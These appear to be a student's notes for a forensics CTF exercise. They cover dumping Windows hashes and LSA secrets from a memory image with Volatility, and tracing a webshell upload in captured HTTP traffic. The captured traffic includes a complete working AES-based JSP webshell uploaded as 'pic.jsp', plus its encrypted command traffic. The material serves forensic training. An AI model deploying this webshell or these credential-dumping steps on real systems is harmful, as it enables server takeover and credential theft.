@@ -1,0 +1,462 @@
+
+第3次练习-电子取证方向
+解读：
+https://blog.csdn.net/m0_58199719/article/details/127096081
+https://blog.lololowe.com/posts/cb78/
+在这里破解密码：https://www.cmd5.com/
+第11题/共13题
+
+实训题
+
+11.实训题
+10分
+取证附件请通过百度网盘自行下载：https://pan.baidu.com/s/1XVNQFQoP_KbdF5Mi3qszsA?pwd=f6ba
+
+请你对Memory.vmem进行取证分析，回答以下问题：
+
+（1）查看当前内存镜像注册表中除系统默认之外的用户名，答案提交格式为：flag{用户名}
+
+（2）查看此系统的密码Hash值，将明文密码作为答案进行提交，答案提交格式为：flag{明文密码}
+
+空1：flag{admin} 
+空2：       Administrator对应的31d6cfe0d16ae931b73c59d7e0c089c0→ 这是空密码的 NT hash（表示 Administrator/Guest 没设置有效密码或是空口令场景），常见于练习镜像。
+
+查看所有用户：
+(base) MacBook-Pro-3:第3次练习-电子取证方向附件 zhangyuanyi$ vol -f Memory.vmem windows.hashdump.Hashdump
+Volatility 3 Framework 2.26.0
+WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Memory.vmem and Memory.vmss.
+Progress:  100.00		PDB scanning finished
+User	rid	lmhash	nthash
+/Users/zhangyuanyi/Library/Python/3.9/lib/python/site-packages/volatility3/framework/deprecation.py:106: FutureWarning: This plugin (volatility3.plugins.windows.hashdump.Hashdump) has been renamed and will be removed in the first release after 2025-09-25. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.registry.hashdump.Hashdump
+  warnings.warn(
+                         LM Hash                                 NT Hash
+Administrator	500	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+Guest	501	aad3b435b51404eeaad3b435b51404ee	31d6cfe0d16ae931b73c59d7e0c089c0
+admin	1000	aad3b435b51404eeaad3b435b51404ee	29fb61bd2963b1975cf435a2565af910
+
+
+
+
+(base) MacBook-Pro-3:第3次练习-电子取证方向附件 zhangyuanyi$ vol -f Memory.vmem windows.lsadump.Lsadump > lsadump.txt
+WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Memory.vmem and Memory.vmss.
+/Users/zhangyuanyi/Library/Python/3.9/lib/python/site-packages/volatility3/framework/deprecation.py:106: FutureWarning: This plugin (volatility3.plugins.windows.lsadump.Lsadump) has been renamed and will be removed in the first release after 2025-09-25. Please ensure all method calls to this plugin are replaced with calls to volatility3.plugins.windows.registry.lsadump.Lsadump
+  warnings.warn(
+
+(base) MacBook-Pro-3:第3次练习-电子取证方向附件 zhangyuanyi$ # 查找包含 DefaultPassword 的行和其上下文
+grep -n -C4 "DefaultPassword" lsadump.txt
+1-Volatility 3 Framework 2.26.0
+2-
+3-Key	Secret	Hex
+4-
+5:DefaultPassword	
+6-4c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 L...............
+7-66 00 6c 00 61 00 67 00 7b 00 34 00 30 00 36 00 f.l.a.g.{.4.0.6.
+8-39 00 39 00 30 00 66 00 66 00 38 00 38 00 66 00 9.9.0.f.f.8.8.f.
+9-31 00 33 00 64 00 61 00 63 00 33 00 63 00 39 00 1.3.d.a.c.3.c.9.
+(base) MacBook-Pro-3:第3次练习-电子取证方向附件 zhangyuanyi$ 
+
+Volatility 3 Framework 2.26.0
+
+Key	Secret	Hex
+
+DefaultPassword	
+4c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 L...............
+66 00 6c 00 61 00 67 00 7b 00 34 00 30 00 36 00 f.l.a.g.{.4.0.6.
+39 00 39 00 30 00 66 00 66 00 38 00 38 00 66 00 9.9.0.f.f.8.8.f.
+31 00 33 00 64 00 61 00 63 00 33 00 63 00 39 00 1.3.d.a.c.3.c.9.
+64 00 65 00 62 00 62 00 63 00 30 00 37 00 36 00 d.e.b.b.c.0.7.6.
+39 00 35 00 38 00 38 00 63 00 7d 00 00 00 00 00 9.5.8.8.c.}.....	4c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 66 00 6c 00 61 00 67 00 7b 00 34 00 30 00 36 00 39 00 39 00 30 00 66 00 66 00 38 00 38 00 66 00 31 00 33 00 64 00 61 00 63 00 33 00 63 00 39 00 64 00 65 00 62 00 62 00 63 00 30 00 37 00 36 00 39 00 35 00 38 00 38 00 63 00 7d 00 00 00 00 00
+DPAPI_SYSTEM	
+2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ,...............
+01 00 00 00 22 0c 11 ce 0e f5 6b c9 f3 4e 83 b0 ....".....k..N..
+8c 0f 9e 75 79 4e 6f 6a 2e 78 8c 18 2e 81 74 3b ...uyNoj.x....t;
+bb 2c 09 a5 bb b2 5d a3 3f 1e 79 09 00 00 00 00 .,....].?.y.....	2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 22 0c 11 ce 0e f5 6b c9 f3 4e 83 b0 8c 0f 9e 75 79 4e 6f 6a 2e 78 8c 18 2e 81 74 3b bb 2c 09 a5 bb b2 5d a3 3f 1e 79 09 00 00 00 00
+
+406990ff88f13dac3c9debbc0769588c
+
+第二题:
+解析参考：https://www.cnblogs.com/handsomesnowsword/p/18765514
+
+http://202.1.1.66:8080/api/upload
+
+Wireshark里面找到的请求，点右键follow http stream：
+POST /api/upload HTTP/1.1
+Access-Flag: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb290IjoiMCIsImV4cCI6MTcxNTQyMjY1OH0._NZIgZpwplDj9vxAyQgTpFVGP5Zragy0ysn5-N3CHRQ
+Content-Type: multipart/form-data; boundary=73c2dff9-ef77-468c-a827-fbc47ae4273b
+Content-Length: 216
+Host: 202.1.1.66:8080
+Connection: close
+Accept-Encoding: gzip, deflate, br
+User-Agent: okhttp/4.9.0
+
+--73c2dff9-ef77-468c-a827-fbc47ae4273b
+Content-Disposition: form-data; name="avatar"; filename="pic.jpg"
+Content-Type: image/jpeg
+Content-Length: 17
+
+#!/bin/bash
+df -h
+--73c2dff9-ef77-468c-a827-fbc47ae4273b--
+
+HTTP/1.1 200 
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 11 May 2024 10:12:45 GMT
+Connection: close
+
+{"msg":"...............","code":100}
+
+找到下一个成功的请求：
+POST /api/upload HTTP/1.1
+Access-Flag: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MTUzNDA5NzEsIm5iZiI6MTcxNTM0MDY1MywiZXhwIjoxNzQ3Mzk1Mjk5LCJyb290IjoiMSJ9.JwIu15l_SfvL4DppXaWUBzDTi7-CMuWSMBasr_I3hYs
+Content-Type: multipart/form-data; boundary=628c1882-2027-4c85-a009-e4cd41af99a9
+Content-Length: 815
+Host: 202.1.1.66:8080
+Connection: close
+Accept-Encoding: gzip, deflate, br
+User-Agent: okhttp/4.9.0
+
+--628c1882-2027-4c85-a009-e4cd41af99a9
+Content-Disposition: form-data; name="avatar"; filename="pic.jsp"
+Content-Type: image/jpeg
+Content-Length: 17
+
+<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if(request.getParameter("bing_pass")!=null){String k=(""+UUID.randomUUID()).replace("-","").substring(16);session.putValue("u",k);out.print(k);return;}Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>
+--628c1882-2027-4c85-a009-e4cd41af99a9--
+
+HTTP/1.1 200 
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+Content-Type: application/json
+Transfer-Encoding: chunked
+Date: Sat, 11 May 2024 10:13:18 GMT
+Connection: close
+
+{"msg":"..................http://202.1.1.66:8080/static/s74e7vwmzs21d5x6.jsp","code":0,"url":"http://202.1.1.66:8080/static/s74e7vwmzs21d5x6.jsp"}
+
+
+
+在这个请求里面有aes的key：
+
+GET /static/s74e7vwmzs21d5x6.jsp?bing_pass=36 HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079.201
+Host: 202.1.1.66:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+
+HTTP/1.1 200 
+Set-Cookie: JSESSIONID=F818FF4F222107084FFD2CBEF1377CE9; Path=/; HttpOnly
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+Content-Type: text/html;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Sat, 11 May 2024 10:14:16 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+8aee7a9278112ca3
+GET /static/s74e7vwmzs21d5x6.jsp?bing_pass=201 HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079.201
+Host: 202.1.1.66:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+
+
+HTTP/1.1 200 
+Set-Cookie: JSESSIONID=FDCFBE8305C84FDAF3E9AEBD662512AD; Path=/; HttpOnly
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+Content-Type: text/html;charset=ISO-8859-1
+Transfer-Encoding: chunked
+Date: Sat, 11 May 2024 10:14:16 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+b99f657b04941030
+POST /static/s74e7vwmzs21d5x6.jsp HTTP/1.1
+Content-Type: application/octet-stream
+Cookie: JSESSIONID=FDCFBE8305C84FDAF3E9AEBD662512AD; Path=/; HttpOnly
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E) QQBrowser/6.9.11079.201
+Cache-Control: no-cache
+Pragma: no-cache
+Host: 202.1.1.66:8080
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: keep-alive
+Content-Length: 8556
+
+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
+HTTP/1.1 200 
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+Content-Type: text/html;charset=UTF-8
+Transfer-Encoding: chunked
+Date: Sat, 11 May 2024 10:14:16 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+......E.h......'.e.J.Mz....q....h..B.,../....".ia.,..ui...QD.. .}.....r.H.|c.....pRN..`..I7!..9.
+.g.$.\R.....i.E.D8._^A...FF^m.tO'1.........K_x.S.*.'e.Q1.....}...g...\...	..Ae..J"...C.....y.4...c#.v..,7..1p;....84.]..}..*$'..S..$...6\...v0XeE*....xX
+{Z.....).[.wki#.....N-.....wd.[...[fuq?.....N..:.3.........]*0.Wn...u..;.B...J..L...e .L.2".....k.qG....,.L.O?P..H..W.......,k..v.g(.v	:.....:...8.X.p
+ju.7\....`..u.Uf...v.%........>.iPG...\W.Bh=".) *....K..W[.../p.y......._..ek.GQ.....<y..A..R i.]^..jyI......]4.q.TW...l]Vh.o..a...V....;n.....
+(UcQ....-..R.9Di7..+.Ws...{.i.j...8...vj$%V..2...P.?....mD....$.0......).
+..o%-p...y.....U.....
+yj.~Yw.Sf.N..@...l...&.....}9z....k..C{:.F....D......\.y.|-`.....$(.vZ..2....Q@o...64.\?p....C..Q.18}...............pVF.....U.E...*,I.Qf.W$.3H...2Y...#.m..W.A..1.)[L.y.P.O...$....nk......k..|*kb..".m.v~Nps.;.V.....Z...Q..;2...w(xTE...).....V.....?i..I...
+.>..T^..Z.A.7...h....*.BmvYI.ty
+.."...@tF!....{..r/B...*4..L@..1&.[jt..*....j8..;./ps....T+...=.H..:...<.K-T..#..
+.@[.lK...-..mp^(...@...S...+B.[A}{{PH....1..$.e.x..3..).7.....-.....
+.D"_..9.w:.IK.<....S.!z3+N.$X......&...9....B1yH...C...e..m[..D...;.._x7..=.Q..	.&~B:....p.w
